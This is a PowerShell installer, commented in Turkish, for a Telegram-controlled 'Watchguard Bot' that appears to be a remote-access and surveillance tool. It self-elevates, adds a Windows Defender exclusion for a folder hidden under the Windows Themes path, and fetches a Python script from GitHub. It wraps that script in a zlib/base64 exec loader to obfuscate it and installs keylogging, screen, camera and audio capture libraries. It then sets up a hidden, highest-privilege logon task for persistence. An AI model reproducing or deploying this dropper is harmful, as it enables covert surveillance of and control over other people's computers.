#Requires -Version 5.1
<#
.SYNOPSIS
    Watchguard Bot v3.0 - Otomatik Kurulum
.DESCRIPTION
    Bot Token, Owner ID ve Shell PIN alir; Python kontrolu yapar,
    watchguard.dat olusturur, bagımlılıkları yukler, Task Scheduler
    gorevi olusturur ve opsiyonel olarak botu baslatır.
#>

# ── UTF-8 konsol cikti ───────────────────────────────────────────────────────
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding             = [System.Text.Encoding]::UTF8

# ── Admin yetkisi kontrolu (kendini yukseltiyor) ─────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
           ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host ""
    Write-Host "  [!] Admin yetkisi gerekiyor - UAC penceresi acilacak..." -ForegroundColor Yellow
    Write-Host ""
    Start-Process powershell -Verb RunAs -ArgumentList `
        "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# ── Renkli cikti yardimcilari ────────────────────────────────────────────────

function Write-Header {
    param([string]$Text)
    Write-Host ""
    Write-Host ("=" * 60) -ForegroundColor Cyan
    Write-Host "  $Text" -ForegroundColor Cyan
    Write-Host ("=" * 60) -ForegroundColor Cyan
    Write-Host ""
}

function Write-Step {
    param([string]$Text)
    Write-Host "[*] $Text" -ForegroundColor Yellow
}

function Write-OK {
    param([string]$Text)
    Write-Host "[OK] $Text" -ForegroundColor Green
}

function Write-Err {
    param([string]$Text)
    Write-Host "[HATA] $Text" -ForegroundColor Red
}

function Write-Info {
    param([string]$Text)
    Write-Host "     $Text" -ForegroundColor Gray
}

# ── Banner ───────────────────────────────────────────────────────────────────

Clear-Host
Write-Host ""
Write-Host "  ========================================================" -ForegroundColor Cyan
Write-Host "       Watchguard Bot v3.0  --  Kurulum                  " -ForegroundColor Cyan
Write-Host "  ========================================================" -ForegroundColor Cyan
Write-Host ""

# ── 1. Kullanıcıdan bilgi al ─────────────────────────────────────────────────

Write-Header "ADIM 1: Bot Bilgileri"

# Bot Token
$token = ""
while ($token -eq "") {
    $token = Read-Host "  Bot Token (BotFather'dan alınan)"
    $token = $token.Trim()
    if ($token -eq "") {
        Write-Err "Bot Token boş olamaz."
    }
}
Write-OK "Bot Token alindi"

# Owner ID
$ownerId = ""
while ($ownerId -eq "") {
    $ownerIdRaw = Read-Host "  Owner ID (Telegram kullanici ID'niz)"
    $ownerIdRaw = $ownerIdRaw.Trim()
    if ($ownerIdRaw -match '^\d+$') {
        $ownerId = $ownerIdRaw
    } else {
        Write-Err "Owner ID sadece rakam icermeli. Ornek: 210965041"
    }
}
Write-OK "Owner ID alindi: $ownerId"

# Shell PIN (opsiyonel)
$pinRaw = Read-Host "  Shell PIN (opsiyonel - sadece rakam, bos birakmak icin Enter)"
$pinRaw = $pinRaw.Trim()
if ($pinRaw -eq "" -or $pinRaw -eq $null) {
    $pin = "null"
    Write-Info "Shell PIN atlatildi (PIN koruması olmayacak)"
} elseif ($pinRaw -match '^\d+$') {
    $pin = $pinRaw
    Write-OK "Shell PIN alindi"
} else {
    Write-Err "PIN sadece rakamlardan olusmali. PIN atlatiliyor."
    $pin = "null"
}

# ── 2. Windows Defender exclusion ───────────────────────────────────────────

Write-Header "ADIM 2: Antivirus Istisnasi"

$watchguardDir = Join-Path $env:APPDATA "Microsoft\Windows\Themes\Watchguard"
Write-Step "Windows Defender istisna ekleniyor..."
Write-Info "Konum: $watchguardDir"
try {
    Add-MpPreference -ExclusionPath $watchguardDir -ErrorAction Stop
    Write-OK "Defender istisna eklendi"
} catch {
    Write-Info "Defender istisna eklenemedi (üçüncü taraf AV olabilir): $_"
    Write-Info "Antivirüs programinizdan asagidaki klasörü istisna olarak ekleyin:"
    Write-Info "  $watchguardDir"
    Write-Host ""
    Read-Host "  Istisnayi ekledikten sonra Enter'a basin"
}

# ── 3. Python bul veya kur ───────────────────────────────────────────────────

Write-Header "ADIM 3: Python Kontrolu"

$pythonExe    = $null
$pythonwExe   = $null

function Find-Python {
    # 1) py launcher
    try {
        $out = & py --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            $exePath = (Get-Command py -ErrorAction SilentlyContinue).Source
            if ($exePath) {
                $wExe = Join-Path (Split-Path $exePath) "pythonw.exe"
                if (-not (Test-Path $wExe)) {
                    # py launcher dizininde olmayabilir - PATH'ten ara
                    $pwCmd = Get-Command pythonw.exe -ErrorAction SilentlyContinue
                    if ($pwCmd) { $wExe = $pwCmd.Source } else { $wExe = $null }
                }
                return @{ python = $exePath; pythonw = $wExe; version = $out.ToString() }
            }
        }
    } catch {}

    # 2) pythonw.exe doğrudan PATH'te
    $pw = Get-Command pythonw.exe -ErrorAction SilentlyContinue
    $p  = Get-Command python.exe  -ErrorAction SilentlyContinue
    if ($pw -and $p) {
        $ver = & python.exe --version 2>&1
        return @{ python = $p.Source; pythonw = $pw.Source; version = $ver.ToString() }
    }

    # 3) Yaygın kurulum dizinleri
    $candidates = @(
        "$env:LOCALAPPDATA\Programs\Python\Python312",
        "$env:LOCALAPPDATA\Programs\Python\Python311",
        "$env:LOCALAPPDATA\Programs\Python\Python310",
        "$env:LOCALAPPDATA\Programs\Python\Python39",
        "C:\Python312",
        "C:\Python311",
        "C:\Python310",
        "C:\Python39",
        "$env:ProgramFiles\Python312",
        "$env:ProgramFiles\Python311"
    )
    foreach ($dir in $candidates) {
        $pExe  = Join-Path $dir "python.exe"
        $pwExe = Join-Path $dir "pythonw.exe"
        if ((Test-Path $pExe) -and (Test-Path $pwExe)) {
            $ver = & $pExe --version 2>&1
            return @{ python = $pExe; pythonw = $pwExe; version = $ver.ToString() }
        }
    }

    return $null
}

Write-Step "Python aranıyor..."
$pyInfo = Find-Python

if ($pyInfo) {
    $pythonExe  = $pyInfo.python
    $pythonwExe = $pyInfo.pythonw
    Write-OK "Python bulundu: $($pyInfo.version)"
    Write-Info "python.exe : $pythonExe"
    Write-Info "pythonw.exe: $pythonwExe"
} else {
    Write-Step "Python bulunamadi - yuklemeye calisiliyor..."

    # winget ile dene
    $wingetOk = $false
    try {
        $wg = Get-Command winget -ErrorAction SilentlyContinue
        if ($wg) {
            Write-Info "winget ile Python 3.12 yukleniyor..."
            & winget install Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
            if ($LASTEXITCODE -eq 0) {
                $wingetOk = $true
                Write-OK "winget kurulumu tamamlandi"
            }
        }
    } catch {}

    if (-not $wingetOk) {
        Write-Info "winget basarisiz - python.org'dan indiriliyor..."
        $installerUrl  = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
        $installerPath = Join-Path $env:TEMP "python_installer.exe"
        try {
            Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing
            Write-Info "Sessiz kurulum baslatiliyor (InstallAllUsers=0)..."
            Start-Process -FilePath $installerPath `
                -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_launcher=1" `
                -Wait
            Write-OK "Python kurulumu tamamlandi"
        } catch {
            Write-Err "Python indirilemedi/kurulamadi: $_"
            Write-Host ""
            Write-Host "  Lutfen https://python.org adresinden Python 3.10+ surumunu" -ForegroundColor White
            Write-Host "  manuel olarak yukleyin, ardından bu kurulum scriptini tekrar calistirin." -ForegroundColor White
            Read-Host "Devam etmek icin Enter'a basin"
            exit 1
        }
    }

    # Yeniden ara
    $pyInfo = Find-Python
    if ($pyInfo) {
        $pythonExe  = $pyInfo.python
        $pythonwExe = $pyInfo.pythonw
        Write-OK "Python hazir: $($pyInfo.version)"
    } else {
        Write-Err "Python hala bulunamadi. PATH'i guncelleyip scripti yeniden calistirin."
        Read-Host "Cikis icin Enter'a basin"
        exit 1
    }
}

# pythonw.exe yoksa python.exe'yi fallback olarak kullan
if (-not $pythonwExe -or -not (Test-Path $pythonwExe)) {
    Write-Info "pythonw.exe bulunamadi - python.exe kullanılacak"
    $pythonwExe = $pythonExe
}

# ── 3. watchguard.dat oluştur ────────────────────────────────────────────────

Write-Header "ADIM 4: Yapilandirma Dosyasi"

$datDir  = Join-Path $env:APPDATA "Microsoft\Windows\Themes\Watchguard"
$datPath = Join-Path $datDir "watchguard.dat"

Write-Step "watchguard.dat olusturuluyor..."
Write-Info "Konum: $datPath"

# Python ile dat dosyasını oluştur
$pythonScript = @"
import zlib, base64, json, os, sys

token    = sys.argv[1]
owner_id = int(sys.argv[2])
pin_arg  = sys.argv[3]
shell_pin = int(pin_arg) if pin_arg != 'null' else None

data = {
    'bot_token': token,
    'owner_id': owner_id,
    'shell_pin': shell_pin,
}

dat_dir  = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Themes', 'Watchguard')
os.makedirs(dat_dir, exist_ok=True)
dat_path = os.path.join(dat_dir, 'watchguard.dat')

raw     = json.dumps(data).encode('utf-8')
encoded = base64.b64encode(zlib.compress(raw)).decode('utf-8')

with open(dat_path, 'w', encoding='utf-8') as f:
    f.write(encoded)

print('OK:' + dat_path)
"@

$tempPy = [System.IO.Path]::GetTempFileName() + '.py'
$pythonScript | Out-File -FilePath $tempPy -Encoding UTF8 -NoNewline

try {
    $result = & $pythonExe $tempPy $token $ownerId $pin 2>&1
    if ($result -like "OK:*") {
        Write-OK "watchguard.dat olusturuldu"
        Write-Info $result
    } else {
        Write-Err "watchguard.dat olusturulamadi:"
        Write-Host $result -ForegroundColor Red
        Remove-Item $tempPy -Force -ErrorAction SilentlyContinue
        Read-Host "Cikis icin Enter'a basin"
        exit 1
    }
} catch {
    Write-Err "Python scripti calistirilamadi: $_"
    Remove-Item $tempPy -Force -ErrorAction SilentlyContinue
    exit 1
}

Remove-Item $tempPy -Force -ErrorAction SilentlyContinue

# ── 4. watchguard_v3.pyw'yi indir ve obfüske et ─────────────────────────────

Write-Header "ADIM 5: Bot Scripti"

$scriptDest = Join-Path $datDir "watchguard_v3.pyw"
$scriptUrl  = "https://raw.githubusercontent.com/zygomatic-git/watchguard/main/watchguard_v3.pyw"
$localScript = Join-Path $PSScriptRoot "watchguard_v3.pyw"
$tempScript  = [System.IO.Path]::GetTempFileName() + '.pyw'

# Önce kaynak dosyayı geçici konuma al
if (Test-Path $localScript) {
    Write-Step "Yerel watchguard_v3.pyw kullaniliyor..."
    Copy-Item $localScript $tempScript -Force
    Write-OK "Kaynak hazir (yerel)"
} else {
    Write-Step "watchguard_v3.pyw indiriliyor..."
    try {
        Invoke-WebRequest -Uri $scriptUrl -OutFile $tempScript -UseBasicParsing
        Write-OK "Kaynak indirildi"
    } catch {
        Write-Err "Indirme hatasi: $_"
        Read-Host "Cikis icin Enter'a basin"
        exit 1
    }
}

# Python ile zlib+base64 obfüskasyonu uygula
Write-Step "Obfuskasyon uygulanıyor..."

$obfPy = @"
import zlib, base64, sys

src = sys.argv[1]
dst = sys.argv[2]

with open(src, 'r', encoding='utf-8') as f:
    source = f.read()

encoded = base64.b64encode(zlib.compress(source.encode('utf-8'))).decode('ascii')
loader  = "import zlib,base64;exec(zlib.decompress(base64.b64decode(b'" + encoded + "')).decode())"

with open(dst, 'w', encoding='utf-8') as f:
    f.write(loader)

print('OK')
"@

$tempObfPy = [System.IO.Path]::GetTempFileName() + '.py'
$obfPy | Out-File -FilePath $tempObfPy -Encoding UTF8 -NoNewline

try {
    $obfResult = & $pythonExe $tempObfPy $tempScript $scriptDest 2>&1
    if ($obfResult -like "OK*") {
        Write-OK "Script obfüske edildi: $scriptDest"
    } else {
        Write-Err "Obfuskasyon hatasi: $obfResult"
        Remove-Item $tempObfPy, $tempScript -Force -ErrorAction SilentlyContinue
        exit 1
    }
} catch {
    Write-Err "Obfuskasyon calistirilamadi: $_"
    exit 1
} finally {
    Remove-Item $tempObfPy, $tempScript -Force -ErrorAction SilentlyContinue
}

# ── 5. Python paketlerini yükle ──────────────────────────────────────────────

Write-Header "ADIM 6: Python Paketleri"

Write-Step "pip guncelleniyor..."
& $pythonExe -m pip install --upgrade pip --quiet 2>&1 | Out-Null

$packages = @(
    "pyTelegramBotAPI",
    "pyautogui",
    "pillow",
    "psutil",
    "opencv-python",
    "numpy",
    "pynput",
    "screeninfo",
    "mss",
    "sounddevice",
    "soundfile",
    "dxcam"
)

Write-Step "Bagimliliklar yukleniyor ($($packages.Count) paket)..."
$packagesJoined = $packages -join " "
$installResult = & $pythonExe -m pip install $packages --quiet 2>&1
if ($LASTEXITCODE -eq 0) {
    Write-OK "Tum paketler yuklendi"
} else {
    Write-Err "Bazi paketler yuklenemedi:"
    Write-Host $installResult -ForegroundColor Yellow
    Write-Info "Script calismaya devam edecek ancak bazi ozellikler calismaybilir."
}

# ── 6. Task Scheduler gorevi ─────────────────────────────────────────────────

Write-Header "ADIM 7: Task Scheduler"

$taskName = "WatchguardBot"

Write-Step "Mevcut gorev temizleniyor (varsa)..."
schtasks /Delete /F /TN $taskName 2>$null | Out-Null

Write-Step "Yeni gorev olusturuluyor..."
Write-Info "Program  : $pythonwExe"
Write-Info "Arguman  : $scriptDest"
Write-Info "Tetikleyici: Oturum Acildiginda"
Write-Info "Yetki    : En yuksek ayricaliklarla"

$createResult = schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN $taskName `
    /TR "`"$pythonwExe`" `"$scriptDest`"" /RU $env:USERNAME 2>&1

if ($LASTEXITCODE -eq 0) {
    Write-OK "Task Scheduler gorevi olusturuldu: $taskName"
} else {
    Write-Err "Task Scheduler gorevi olusturulamadi:"
    Write-Host $createResult -ForegroundColor Yellow
    Write-Info "Gorevi manuel olarak olusturabilirsiniz:"
    Write-Info "  Program : $pythonwExe"
    Write-Info "  Arguman : `"$scriptDest`""
    Write-Info "  Tetikleyici: Oturum acildiginda"
}

# ── 7. Simdi baslatmak istiyor mu? ───────────────────────────────────────────

Write-Header "ADIM 8: Baslatma"

$startNow = Read-Host "  Botu simdi baslatmak ister misiniz? (E/H)"
if ($startNow -match '^[Ee]') {
    Write-Step "Watchguard Bot baslatiliyor..."
    try {
        Start-Process -FilePath $pythonwExe -ArgumentList "`"$scriptDest`"" -WindowStyle Hidden
        Write-OK "Bot arka planda baslatildi"
        Write-Info "Birkaç saniye sonra Telegram'dan bildirim almalisiniz."
    } catch {
        Write-Err "Baslatma hatasi: $_"
        Write-Info "Manuel baslatmak icin:"
        Write-Info "  & `"$pythonwExe`" `"$scriptDest`""
    }
} else {
    Write-Info "Bot simdi baslatilmadi. Bir sonraki oturum acilisinda otomatik baslar."
}

# ── 8. Ozet ──────────────────────────────────────────────────────────────────

Write-Header "KURULUM TAMAMLANDI"

Write-Host "  Kurulum ozeti:" -ForegroundColor White
Write-Host ""
Write-Host "  Python       : $pythonExe" -ForegroundColor Gray
Write-Host "  pythonw      : $pythonwExe" -ForegroundColor Gray
Write-Host "  Bot scripti  : $scriptDest" -ForegroundColor Gray
Write-Host "  Config       : $datPath" -ForegroundColor Gray
Write-Host "  Task Adı     : $taskName" -ForegroundColor Gray
Write-Host ""
Write-Host "  Watchguard Bot sisteminiz hazir!" -ForegroundColor Green
Write-Host "  Bir sonraki oturum acilisinda otomatik olarak baslar." -ForegroundColor Green
Write-Host ""

Read-Host "Cikis icin Enter'a basin"
